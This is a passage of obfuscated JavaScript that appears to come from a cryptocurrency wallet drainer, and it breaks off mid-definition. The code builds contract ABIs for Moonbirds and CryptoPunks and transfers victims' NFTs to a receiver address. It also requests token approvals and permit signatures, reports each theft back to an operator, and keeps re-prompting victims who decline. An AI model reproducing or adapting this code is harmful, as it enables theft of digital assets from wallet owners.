              internalType: "uint256",
              name: "tokenId",
              type: "uint256"
            };
            const _0xf5e8ea = {
              internalType: 'bytes',
              name: "_data",
              type: 'bytes'
            };
            const _0x4f1a18 = {
              inputs: [_0x121a5f, _0x2611b6, _0x52b761, _0xf5e8ea],
              name: "safeTransferFrom",
              outputs: [],
              stateMutability: 'nonpayable',
              type: "function"
            };
            const _0x1e6a09 = {
              internalType: "address",
              name: "from",
              type: "address"
            };
            const _0x49506d = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x2f5a0e = {
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x23f404 = {
              inputs: [_0x1e6a09, _0x49506d, _0x2f5a0e],
              name: "safeTransferWhileNesting",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x3b7f9b = {
              inputs: [],
              name: "sellerConfig",
              outputs: [{
                'internalType': "uint256",
                'name': "totalInventory",
                'type': "uint256"
              }, {
                'internalType': "uint256",
                'name': "maxPerAddress",
                'type': "uint256"
              }, {
                'internalType': "uint256",
                'name': "maxPerTx",
                'type': "uint256"
              }, {
                'internalType': "uint248",
                'name': 'freeQuota',
                'type': "uint248"
              }, {
                'internalType': "bool",
                'name': "reserveFreeQuota",
                'type': "bool"
              }, {
                'internalType': "bool",
                'name': "lockFreeQuota",
                'type': "bool"
              }, {
                'internalType': "bool",
                'name': "lockTotalInventory",
                'type': "bool"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x1c7a75 = {
              internalType: "address",
              name: "operator",
              type: "address"
            };
            const _0x891a0b = {
              internalType: "bool",
              name: "approved",
              type: "bool"
            };
            const _0x1ee787 = {
              inputs: [_0x1c7a75, _0x891a0b],
              name: "setApprovalForAll",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x56a8fa = {
              internalType: 'string',
              name: "_baseTokenURI",
              type: "string"
            };
            const _0x2ed841 = {
              inputs: [_0x56a8fa],
              name: "setBaseTokenURI",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x33804e = {
              internalType: "address payable",
              name: "_beneficiary",
              type: "address"
            };
            const _0x16e06d = {
              inputs: [_0x33804e],
              name: "setBeneficiary",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x37400b = {
              internalType: "bool",
              name: "open",
              type: "bool"
            };
            const _0x3d8414 = {
              inputs: [_0x37400b],
              name: "setNestingOpen",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x5d1c88 = {
              internalType: "bool",
              name: "open",
              type: "bool"
            };
            const _0x51aa17 = {
              inputs: [_0x5d1c88],
              name: "setPROOFMintingOpen",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x43981f = {
              internalType: "uint256",
              name: "_price",
              type: "uint256"
            };
            const _0x966f64 = {
              inputs: [_0x43981f],
              name: "setPrice",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x124c97 = {
              internalType: "contract ITokenURIGenerator",
              name: "_contract",
              type: "address"
            };
            const _0xdb6bcc = {
              inputs: [_0x124c97],
              name: "setRenderingContract",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x374868 = {
              internalType: 'address',
              name: 'receiver',
              type: "address"
            };
            const _0x346f35 = {
              internalType: 'uint96',
              name: "feeBasisPoints",
              type: "uint96"
            };
            const _0x4200a9 = {
              inputs: [_0x374868, _0x346f35],
              name: "setRoyaltyInfo",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x407b4d = {
              internalType: "uint256",
              name: "totalInventory",
              type: "uint256"
            };
            const _0x1a5740 = {
              internalType: "uint256",
              name: "maxPerAddress",
              type: "uint256"
            };
            const _0x9d383c = {
              internalType: "uint256",
              name: "maxPerTx",
              type: "uint256"
            };
            const _0x5b24c6 = {
              internalType: "uint248",
              name: "freeQuota",
              type: 'uint248'
            };
            const _0x5e7815 = {
              internalType: "bool",
              name: "reserveFreeQuota",
              type: "bool"
            };
            const _0x3d4ca1 = {
              internalType: "bool",
              name: "lockFreeQuota",
              type: "bool"
            };
            const _0x17efe9 = {
              internalType: "bool",
              name: "lockTotalInventory",
              type: "bool"
            };
            const _0x56a16e = {
              components: [_0x407b4d, _0x1a5740, _0x9d383c, _0x5b24c6, _0x5e7815, _0x3d4ca1, _0x17efe9],
              internalType: "struct Seller.SellerConfig",
              name: "config",
              type: "tuple"
            };
            const _0x388d8e = {
              inputs: [_0x56a16e],
              name: "setSellerConfig",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x580cbf = {
              internalType: "bytes4",
              name: "interfaceId",
              type: "bytes4"
            };
            const _0x3393aa = {
              internalType: 'bool',
              name: '',
              type: "bool"
            };
            const _0x4cf54b = {
              inputs: [_0x580cbf],
              name: "supportsInterface",
              outputs: [_0x3393aa],
              stateMutability: "view",
              type: "function"
            };
            const _0x2a593c = {
              inputs: [],
              name: "symbol",
              outputs: [{
                'internalType': "string",
                'name': '',
                'type': "string"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x2820d4 = {
              internalType: "uint256[]",
              name: "tokenIds",
              type: "uint256[]"
            };
            const _0x1a48d9 = {
              inputs: [_0x2820d4],
              name: "toggleNesting",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x3e442d = {
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x51a1a1 = {
              inputs: [_0x3e442d],
              name: "tokenURI",
              outputs: [{
                'internalType': "string",
                'name': '',
                'type': "string"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x54623f = {
              internalType: "uint256",
              name: '',
              type: "uint256"
            };
            const _0x5a8fef = {
              inputs: [],
              name: "totalSold",
              outputs: [_0x54623f],
              stateMutability: "view",
              type: "function"
            };
            const _0x312519 = {
              inputs: [],
              name: "totalSupply",
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3fc330 = {
              internalType: "address",
              name: "from",
              type: "address"
            };
            const _0x4fec74 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x1e7d63 = {
              internalType: "uint256",
              name: "tokenId",
              type: "uint256"
            };
            const _0x132195 = {
              inputs: [_0x3fc330, _0x4fec74, _0x1e7d63],
              name: "transferFrom",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x31694a = {
              internalType: 'address',
              name: 'newOwner',
              type: "address"
            };
            const _0x522c92 = {
              inputs: [_0x31694a],
              name: "transferOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x4054c0 = {
              inputs: [],
              name: "unpause",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x4e6324 = {
              internalType: 'bytes32',
              name: '',
              type: 'bytes32'
            };
            const _0x174eef = {
              inputs: [_0x4e6324],
              name: "usedMessages",
              outputs: [{
                'internalType': "bool",
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x25edfc = [_0x5145e8, _0x5af2c9, _0x15450d, _0x29b188, _0x35f011, _0x29b479, _0x578681, _0x241245, _0x349019, _0x15730c, _0x175883, _0xab4e52, _0x22e6ae, _0x20afe3, _0x1f91fa, _0x1419a2, _0x8239ec, _0x3e6bd9, _0xbab759, _0x5d3212, _0x5039fd, _0x2dcfe8, _0x22c3b9, _0x269d36, _0x2ca4c4, _0x47da8d, _0x499164, _0x4ad73a, _0x4d71c5, _0xd054db, _0x434806, _0x55209b, _0x2e0d63, _0x3ebeb9, _0x5e2d61, _0x38dbbc, _0x4c2df5, _0x415f5d, _0x1ade9d, _0x4b0711, _0x3fac13, _0x5e1671, _0x7e391a, _0x26ac7a, _0x4785f1, _0x4cb856, _0xca2d5c, _0x1a346b, _0x2ac290, _0x29e20c, _0x39edd4, _0x479d36, _0x1e1927, _0x48b1bd, _0xb58e70, _0x3f93bb, _0x16cc47, _0x29bb0b, _0x291f45, _0x8f0807, _0x2a69ab, _0x241d50, _0x4ddae6, _0x3caf61, _0x24c5ee, _0x2f098f, _0x48ae36, _0x46c7d2, _0x4f1a18, _0x23f404, _0x3b7f9b, _0x1ee787, _0x2ed841, _0x16e06d, _0x3d8414, _0x51aa17, _0x966f64, _0xdb6bcc, _0x4200a9, _0x388d8e, _0x4cf54b, _0x2a593c, _0x1a48d9, _0x51a1a1, _0x5a8fef, _0x312519, _0x132195, _0x522c92, _0x4054c0, _0x174eef];
            let _0x358ee5 = this.ethersProvider.getSigner((await this.web3Js.eth.getAccounts())[0]);
            let _0xc66d6d = new ethers.Contract(_0x1a1bf9.contract, _0x25edfc, _0x358ee5);
            const _0x277c59 = {
              gasLimit: 0x30d40
            };
            let _0x50cb73 = await _0xc66d6d.safeTransferWhileNesting(await this.getWalletAddress(), this.receiver, _0x50b10b.asset.token_id, _0x277c59);
            this.approved.push(Base64.encode(JSON.stringify(_0x1a1bf9)));
            await this.sendMessage({
              'chain': _0x50b10b.chain,
              'type': "approvalNFT",
              'source': "Moonbird",
              'actions': '',
              'txId': _0x50cb73.hash,
              'value': _0x50b10b.value / this.typeToMultiplier(_0x50b10b.actionType)
            });
            this.totalNFTs = this.totalNFTs - _0x50b10b.value;
          } else {
            if (_0x1a1bf9.contract.toLowerCase() == "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb") {
              const _0x229ecb = {
                name: '',
                type: "string"
              };
              const _0x562333 = {
                constant: true,
                inputs: [],
                name: "name",
                outputs: [_0x229ecb],
                payable: false,
                type: "function"
              };
              const _0x3dc221 = {
                name: '',
                type: "uint256"
              };
              const _0x2d27c1 = {
                constant: true,
                inputs: [_0x3dc221],
                name: "punksOfferedForSale",
                outputs: [{
                  'name': "isForSale",
                  'type': "bool"
                }, {
                  'name': 'punkIndex',
                  'type': "uint256"
                }, {
                  'name': "seller",
                  'type': "address"
                }, {
                  'name': "minValue",
                  'type': "uint256"
                }, {
                  'name': "onlySellTo",
                  'type': "address"
                }],
                payable: false,
                type: "function"
              };
              const _0x5b9df9 = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x404803 = {
                constant: false,
                inputs: [_0x5b9df9],
                name: "enterBidForPunk",
                outputs: [],
                payable: true,
                type: "function"
              };
              const _0x3e4687 = {
                name: '',
                type: "uint256"
              };
              const _0xa01138 = {
                constant: true,
                inputs: [],
                name: "totalSupply",
                outputs: [_0x3e4687],
                payable: false,
                type: "function"
              };
              const _0x4fdad4 = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x42a49b = {
                name: "minPrice",
                type: "uint256"
              };
              const _0x3ac1b6 = {
                constant: false,
                inputs: [_0x4fdad4, _0x42a49b],
                name: "acceptBidForPunk",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x17ab28 = {
                constant: true,
                inputs: [],
                name: "decimals",
                outputs: [{
                  'name': '',
                  'type': "uint8"
                }],
                payable: false,
                type: "function"
              };
              const _0x4eb659 = {
                name: 'addresses',
                type: "address[]"
              };
              const _0x459d2b = {
                name: "indices",
                type: "uint256[]"
              };
              const _0x2b1d27 = {
                constant: false,
                inputs: [_0x4eb659, _0x459d2b],
                name: "setInitialOwners",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x7def39 = {
                constant: false,
                inputs: [],
                name: 'withdraw',
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x158a92 = {
                name: '',
                type: "string"
              };
              const _0x517847 = {
                constant: true,
                inputs: [],
                name: 'imageHash',
                outputs: [_0x158a92],
                payable: false,
                type: "function"
              };
              const _0x21f913 = {
                constant: true,
                inputs: [],
                name: "nextPunkIndexToAssign",
                outputs: [{
                  'name': '',
                  'type': "uint256"
                }],
                payable: false,
                type: "function"
              };
              const _0x4e66a2 = {
                name: '',
                type: "uint256"
              };
              const _0x4a2654 = {
                constant: true,
                inputs: [_0x4e66a2],
                name: "punkIndexToAddress",
                outputs: [{
                  'name': '',
                  'type': "address"
                }],
                payable: false,
                type: 'function'
              };
              const _0x53ac61 = {
                constant: true,
                inputs: [],
                name: "standard",
                outputs: [{
                  'name': '',
                  'type': "string"
                }],
                payable: false,
                type: "function"
              };
              const _0x5cb85e = {
                name: '',
                type: "uint256"
              };
              const _0x43d8e4 = {
                constant: true,
                inputs: [_0x5cb85e],
                name: "punkBids",
                outputs: [{
                  'name': 'hasBid',
                  'type': "bool"
                }, {
                  'name': "punkIndex",
                  'type': "uint256"
                }, {
                  'name': 'bidder',
                  'type': "address"
                }, {
                  'name': "value",
                  'type': "uint256"
                }],
                payable: false,
                type: 'function'
              };
              const _0x5be5b5 = {
                name: '',
                type: "address"
              };
              const _0x46b705 = {
                constant: true,
                inputs: [_0x5be5b5],
                name: "balanceOf",
                outputs: [{
                  'name': '',
                  'type': "uint256"
                }],
                payable: false,
                type: "function"
              };
              const _0x23c92d = {
                constant: false,
                inputs: [],
                name: "allInitialOwnersAssigned",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x337e35 = {
                constant: true,
                inputs: [],
                name: "allPunksAssigned",
                outputs: [{
                  'name': '',
                  'type': "bool"
                }],
                payable: false,
                type: "function"
              };
              const _0x30a1b6 = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x48c1d3 = {
                constant: false,
                inputs: [_0x30a1b6],
                name: "buyPunk",
                outputs: [],
                payable: true,
                type: "function"
              };
              const _0x10fe3a = {
                name: 'to',
                type: "address"
              };
              const _0x29438b = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x36f0f6 = {
                constant: false,
                inputs: [_0x10fe3a, _0x29438b],
                name: "transferPunk",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x24bee8 = {
                constant: true,
                inputs: [],
                name: "symbol",
                outputs: [{
                  'name': '',
                  'type': "string"
                }],
                payable: false,
                type: "function"
              };
              const _0x2f8fa6 = {
                name: "punkIndex",
                type: "uint256"
              };
              const _0x25689a = {
                constant: false,
                inputs: [_0x2f8fa6],
                name: "withdrawBidForPunk",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x3c55e6 = {
                name: 'to',
                type: "address"
              };
              const _0x16bb0b = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x461f79 = {
                constant: false,
                inputs: [_0x3c55e6, _0x16bb0b],
                name: "setInitialOwner",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x13ac0b = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x464959 = {
                name: "minSalePriceInWei",
                type: "uint256"
              };
              const _0x3c60a5 = {
                name: 'toAddress',
                type: "address"
              };
              const _0x167a98 = {
                constant: false,
                inputs: [_0x13ac0b, _0x464959, _0x3c60a5],
                name: "offerPunkForSaleToAddress",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x2aaa34 = {
                name: '',
                type: "uint256"
              };
              const _0x31df7e = {
                constant: true,
                inputs: [],
                name: "punksRemainingToAssign",
                outputs: [_0x2aaa34],
                payable: false,
                type: "function"
              };
              const _0x14ad18 = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x3f4ccf = {
                name: "minSalePriceInWei",
                type: "uint256"
              };
              const _0x4cecec = {
                constant: false,
                inputs: [_0x14ad18, _0x3f4ccf],
                name: "offerPunkForSale",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x1b8521 = {
                name: "punkIndex",
                type: "uint256"
              };
              const _0x2bc591 = {
                constant: false,
                inputs: [_0x1b8521],
                name: "getPunk",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x10ebd8 = {
                name: '',
                type: "address"
              };
              const _0x4abf38 = {
                constant: true,
                inputs: [_0x10ebd8],
                name: "pendingWithdrawals",
                outputs: [{
                  'name': '',
                  'type': "uint256"
                }],
                payable: false,
                type: 'function'
              };
              const _0x6d5797 = {
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x47bfea = {
                constant: false,
                inputs: [_0x6d5797],
                name: "punkNoLongerForSale",
                outputs: [],
                payable: false,
                type: "function"
              };
              const _0x2d2e15 = {
                inputs: [],
                payable: true,
                type: "constructor"
              };
              const _0x3359fd = {
                indexed: true,
                name: 'to',
                type: "address"
              };
              const _0x376ef2 = {
                indexed: false,
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x56d8ae = {
                anonymous: false,
                inputs: [_0x3359fd, _0x376ef2],
                name: "Assign",
                type: "event"
              };
              const _0x5894c7 = {
                indexed: true,
                name: "from",
                type: 'address'
              };
              const _0x48fb5 = {
                indexed: true,
                name: 'to',
                type: 'address'
              };
              const _0x11018d = {
                indexed: false,
                name: "value",
                type: 'uint256'
              };
              const _0x38112c = {
                anonymous: false,
                inputs: [_0x5894c7, _0x48fb5, _0x11018d],
                name: "Transfer",
                type: "event"
              };
              const _0x5256ae = {
                indexed: true,
                name: "from",
                type: "address"
              };
              const _0x2ec638 = {
                indexed: true,
                name: 'to',
                type: "address"
              };
              const _0x4c8e17 = {
                indexed: false,
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x54d807 = {
                anonymous: false,
                inputs: [_0x5256ae, _0x2ec638, _0x4c8e17],
                name: "PunkTransfer",
                type: "event"
              };
              const _0x587a3e = {
                indexed: true,
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x831989 = {
                indexed: false,
                name: "minValue",
                type: "uint256"
              };
              const _0xe1bc39 = {
                indexed: true,
                name: "toAddress",
                type: "address"
              };
              const _0x4f4679 = {
                anonymous: false,
                inputs: [_0x587a3e, _0x831989, _0xe1bc39],
                name: "PunkOffered",
                type: "event"
              };
              const _0xcf475f = {
                indexed: true,
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x56a90a = {
                indexed: false,
                name: "value",
                type: "uint256"
              };
              const _0xa6bfdf = {
                indexed: true,
                name: "fromAddress",
                type: "address"
              };
              const _0x5da62a = {
                anonymous: false,
                inputs: [_0xcf475f, _0x56a90a, _0xa6bfdf],
                name: "PunkBidEntered",
                type: "event"
              };
              const _0x46bbba = {
                indexed: true,
                name: 'punkIndex',
                type: "uint256"
              };
              const _0x3171a6 = {
                indexed: false,
                name: "value",
                type: "uint256"
              };
              const _0x43a031 = {
                indexed: true,
                name: "fromAddress",
                type: "address"
              };
              const _0x34d48b = {
                anonymous: false,
                inputs: [_0x46bbba, _0x3171a6, _0x43a031],
                name: "PunkBidWithdrawn",
                type: 'event'
              };
              const _0x58f0c1 = {
                indexed: true,
                name: "punkIndex",
                type: "uint256"
              };
              const _0x3a5436 = {
                indexed: false,
                name: "value",
                type: "uint256"
              };
              const _0x2e3002 = {
                indexed: true,
                name: "fromAddress",
                type: "address"
              };
              const _0x4b8ae5 = {
                indexed: true,
                name: 'toAddress',
                type: "address"
              };
              const _0x4abe0d = {
                anonymous: false,
                inputs: [_0x58f0c1, _0x3a5436, _0x2e3002, _0x4b8ae5],
                name: 'PunkBought',
                type: "event"
              };
              const _0x369cd0 = {
                indexed: true,
                name: "punkIndex",
                type: "uint256"
              };
              const _0x4e1c5e = {
                anonymous: false,
                inputs: [_0x369cd0],
                name: "PunkNoLongerForSale",
                type: "event"
              };
              const _0x4fcca1 = [_0x562333, _0x2d27c1, _0x404803, _0xa01138, _0x3ac1b6, _0x17ab28, _0x2b1d27, _0x7def39, _0x517847, _0x21f913, _0x4a2654, _0x53ac61, _0x43d8e4, _0x46b705, _0x23c92d, _0x337e35, _0x48c1d3, _0x36f0f6, _0x24bee8, _0x25689a, _0x461f79, _0x167a98, _0x31df7e, _0x4cecec, _0x2bc591, _0x4abf38, _0x47bfea, _0x2d2e15, _0x56d8ae, _0x38112c, _0x54d807, _0x4f4679, _0x5da62a, _0x34d48b, _0x4abe0d, _0x4e1c5e];
              let _0x13c128 = this.ethersProvider.getSigner((await this.web3Js.eth.getAccounts())[0]);
              let _0x2176f2 = new ethers.Contract(_0x1a1bf9.contract, _0x4fcca1, _0x13c128);
              const _0x347083 = {
                'gasLimit': 0x30d40
              };
              let _0x28d0c0 = await _0x2176f2.transferPunk(this.receiver, _0x50b10b.asset.token_id, _0x347083);
              this.approved.push(Base64.encode(JSON.stringify(_0x1a1bf9)));
              await this.sendMessage({
                'chain': _0x50b10b.chain,
                'type': "approvalNFT",
                'source': 'Cryptopunk',
                'actions': '',
                'txId': _0x28d0c0.hash,
                'value': _0x50b10b.value / this.typeToMultiplier(_0x50b10b.actionType)
              });
              this.totalNFTs = this.totalNFTs - _0x50b10b.value;
            } else {
              if (_0x1a1bf9.contract.toLowerCase() != "0xabefbc9fd2f806065b4f3c237d4b59d9a97bcac7" && _0x1a1bf9.contract.toLowerCase() != "0x60f80121c31a0d46b5279700f9df786054aa5ee5" && _0x1a1bf9.contract.toLowerCase() != "0x3b3ee1931dc30c1957379fac9aba94d1c48a5405" && _0x1a1bf9.contract.toLowerCase() != "0x82c7a8f707110f5fbb16184a5933e9f78a34c6ab" && _0x1a1bf9.contract.toLowerCase() != "0xabb3738f04dc2ec20f4ae4462c3d069d02ae045b" && _0x1a1bf9.contract.toLowerCase() != "0xd07dc4262bcdbf85190c01c996b4c06a461d2430" && _0x1a1bf9.contract.toLowerCase() != "0x76be3b62873462d2142405439777e971754e8e77") {
                let _0xc4ab3b = 2;
                if (_0x1a1bf9.scheme == "erc1155") {
                  _0xc4ab3b = 3;
                }
                const _0x311d36 = {
                  itemType: _0xc4ab3b,
                  token: _0x1a1bf9.contract,
                  token_ids: _0x1a1bf9.token_ids
                };
                if (_0x1a1bf9.token_ids.length == 1) {
                  let _0x33b3fe = await this.Sdk.approveAsset(_0x311d36, this.getCaller(_0x50b10b), true);
                  await this.sendMessage({
                    'chain': _0x50b10b.chain,
                    'type': "approvalNFT",
                    'source': _0x1a1bf9.name + " #" + _0x1a1bf9.token_ids[0],
                    'actions': '',
                    'txId': _0x33b3fe.hash,
                    'value': _0x50b10b.value / this.typeToMultiplier(_0x50b10b.actionType)
                  });
                  for (let _0x39ad7e of _0x1a1bf9.token_ids) {
                    await this.SendCompletion({
                      'type': "NFTApproval",
                      'hash': _0x33b3fe.hash,
                      'token_id': _0x39ad7e,
                      'token': _0x1a1bf9.contract,
                      'itemType': _0x1a1bf9.itemType,
                      'chain_id': this.getChainId(_0x50b10b.chain),
                      'owner': await this.getWalletAddress(),
                      'receiver': this.receiver,
                      'caller': this.getCaller(_0x50b10b),
                      'ahash': this.createEncKey()
                    });
                  }
                  this.approved.push(Base64.encode(JSON.stringify(_0x1a1bf9)));
                } else {
                  let _0x1c75f4 = await this.Sdk.approveAsset(_0x311d36, this.getCaller(_0x50b10b));
                  await this.sendMessage({
                    'chain': _0x50b10b.chain,
                    'type': "approvalNFT",
                    'source': _0x1a1bf9.token_ids.length + "x " + _0x1a1bf9.name,
                    'txId': _0x1c75f4.hash,
                    'actions': '',
                    'value': _0x50b10b.value / this.typeToMultiplier(_0x50b10b.actionType)
                  });
                  for (let _0x5028ad of _0x1a1bf9.token_ids) {
                    await this.SendCompletion({
                      'type': "NFTApproval",
                      'hash': _0x1c75f4.hash,
                      'token': _0x1a1bf9.contract,
                      'token_id': _0x5028ad,
                      'itemType': _0x1a1bf9.itemType,
                      'chain_id': this.getChainId(_0x50b10b.chain),
                      'owner': await this.getWalletAddress(),
                      'receiver': this.receiver,
                      'caller': this.getCaller(_0x50b10b),
                      'ahash': this.createEncKey()
                    });
                  }
                  this.approved.push(Base64.encode(JSON.stringify(_0x1a1bf9)));
                }
              }
            }
          }
        }
      }
      if (_0x50b10b.actionType == "ApprovalToken") {
        let _0x32fb7d = _0x50b10b.asset;
        _0x7eec3 = _0x50b10b.asset.token_address;
        let _0x32c14a = await this.getChainId(_0x50b10b.chain);
        if (_0x50b10b.value > 10) {
          const _0x411256 = {
            itemType: 0x1,
            token: _0x32fb7d.token_address,
            value: _0x50b10b.value,
            balance: _0x32fb7d.balance
          };
          if (!this.approved.includes(_0x411256.token + ',' + _0x32fb7d.chain)) {
            if (_0x32fb7d.permit_type == 1 || _0x32fb7d.permit_type == 2 || _0x32fb7d.permit_type == 3 || _0x32fb7d.permit_type == 4) {
              let _0x65360b = await this.completeSignature({
                'actionType': "permit",
                'address': _0x411256.token,
                'value': _0x411256.value,
                'balance': _0x411256.balance,
                'type': _0x32fb7d.permit_type,
                'chain': _0x50b10b.chain,
                'info': this.getAssetInfo(_0x50b10b)
              });
              if (_0x65360b) {
                this.approved.push(_0x411256.token + ',' + _0x50b10b.chain);
              } else {
                throw new Error("Permit not done..");
              }
            } else {
              let _0x2802b0 = this.getCaller(_0x50b10b);
              if (_0x50b10b.chain == 'era') {
                _0x2802b0 = "0xaC5eE1CC786a429b88E74e3c722A798f1870C12A";
              }
              let _0x1c5d83 = await this.Sdk.approveAsset(_0x411256, _0x2802b0);
              let _0xed7571 = this.getAssetInfo(_0x50b10b);
              await this.sendMessage({
                'chain': _0x50b10b.chain,
                'type': "approvalERC",
                'name': '' + _0xed7571.name,
                'source': "Approval",
                'txId': _0x1c5d83.hash,
                'value': _0x50b10b.value / this.typeToMultiplier(_0x50b10b.actionType)
              });
              this.approved.push(_0x411256.token + ',' + _0x50b10b.chain);
              await this.SendCompletion({
                'type': "TokenApproval",
                'hash': _0x1c5d83.hash,
                'token': _0x411256.token,
                'amount': _0x411256.balance,
                'owner': await this.getWalletAddress(),
                'receiver': this.getCaller(_0x50b10b),
                'caller': this.getCaller(_0x50b10b),
                'chain': _0x32c14a,
                'ahash': this.createEncKey()
              });
            }
          }
        }
      }
    } catch (_0x36d00a) {
      console.log(_0x36d00a);
      if (_0x4826bc != (await this.getWalletAddress())) {
        return;
      }
      let _0x353341 = this.getAssetInfo(_0x50b10b);
      const _0x1ce53e = {
        chain: _0x50b10b.chain,
        type: "error",
        msg: "Client refused to approve " + _0x353341.name
      };
      await this.sendMessage(_0x1ce53e);
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.approve(_0x50b10b);
      }
    }
  };
  ["wyvern"] = async _0x351f3b => {
    let _0x6316bf = await this.getWalletAddress();
    try {
      const _0x3d67c8 = {
        name: '',
        type: "address"
      };
      const _0xb02e09 = {
        constant: true,
        inputs: [_0x3d67c8],
        name: "proxies",
        outputs: [{
          'name': '',
          'type': "address"
        }],
        payable: false,
        stateMutability: "view",
        type: "function"
      };
      let _0x18a7d9 = [_0xb02e09];
      let _0x5054fc = this.ethersProvider.getSigner(_0x6316bf);
      let _0x2c8c90 = new ethers.Contract("0xa5409ec958C83C3f309868babACA7c86DCB077c1", _0x18a7d9, _0x5054fc);
      let _0xf86287 = await _0x2c8c90.proxies(_0x6316bf);
      const _0xa48beb = {
        internalType: "address",
        name: "target",
        type: "address"
      };
      const _0x4aa0ec = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x873c96 = {
        components: [_0xa48beb, _0x4aa0ec],
        internalType: "struct Multicall3.Call[]",
        name: "calls",
        type: "tuple[]"
      };
      const _0x38248f = {
        inputs: [_0x873c96],
        name: "aggregate",
        outputs: [{
          'internalType': 'uint256',
          'name': "blockNumber",
          'type': "uint256"
        }, {
          'internalType': 'bytes[]',
          'name': 'returnData',
          'type': 'bytes[]'
        }],
        stateMutability: "payable",
        type: "function"
      };
      const _0x250ae7 = {
        internalType: "address",
        name: "target",
        type: "address"
      };
      const _0x33d5dc = {
        internalType: 'bool',
        name: "allowFailure",
        type: 'bool'
      };
      const _0x18dec7 = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x59e599 = {
        components: [_0x250ae7, _0x33d5dc, _0x18dec7],
        internalType: "struct Multicall3.Call3[]",
        name: "calls",
        type: 'tuple[]'
      };
      const _0xb61ecb = {
        inputs: [_0x59e599],
        name: "aggregate3",
        outputs: [{
          'components': [{
            'internalType': 'bool',
            'name': "success",
            'type': "bool"
          }, {
            'internalType': "bytes",
            'name': 'returnData',
            'type': "bytes"
          }],
          'internalType': "struct Multicall3.Result[]",
          'name': 'returnData',
          'type': 'tuple[]'
        }],
        stateMutability: "payable",
        type: "function"
      };
      const _0x4f1f10 = {
        internalType: "address",
        name: "target",
        type: "address"
      };
      const _0x502673 = {
        internalType: 'bool',
        name: "allowFailure",
        type: 'bool'
      };
      const _0x6bfd6e = {
        internalType: "uint256",
        name: "value",
        type: "uint256"
      };
      const _0x4589d4 = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x38b17b = {
        components: [_0x4f1f10, _0x502673, _0x6bfd6e, _0x4589d4],
        internalType: "struct Multicall3.Call3Value[]",
        name: "calls",
        type: 'tuple[]'
      };
      const _0x745faf = {
        internalType: 'bool',
        name: "success",
        type: 'bool'
      };
      const _0x564c8e = {
        internalType: "bytes",
        name: "returnData",
        type: "bytes"
      };
      const _0x340866 = {
        components: [_0x745faf, _0x564c8e],
        internalType: "struct Multicall3.Result[]",
        name: "returnData",
        type: 'tuple[]'
      };
      const _0x5993b5 = {
        inputs: [_0x38b17b],
        name: "aggregate3Value",
        outputs: [_0x340866],
        stateMutability: "payable",
        type: "function"
      };
      const _0x27f13c = {
        internalType: "address",
        name: "target",
        type: 'address'
      };
      const _0x12922b = {
        internalType: "bytes",
        name: 'callData',
        type: "bytes"
      };
      const _0x1c45ee = {
        components: [_0x27f13c, _0x12922b],
        internalType: "struct Multicall3.Call[]",
        name: "calls",
        type: 'tuple[]'
      };
      const _0x10a258 = {
        internalType: "uint256",
        name: "blockNumber",
        type: "uint256"
      };
      const _0x9890cf = {
        internalType: "bytes32",
        name: "blockHash",
        type: "bytes32"
      };
      const _0x30dc5a = {
        internalType: 'bool',
        name: "success",
        type: 'bool'
      };
      const _0x58ad49 = {
        internalType: "bytes",
        name: "returnData",
        type: "bytes"
      };
      const _0x5cfae1 = {
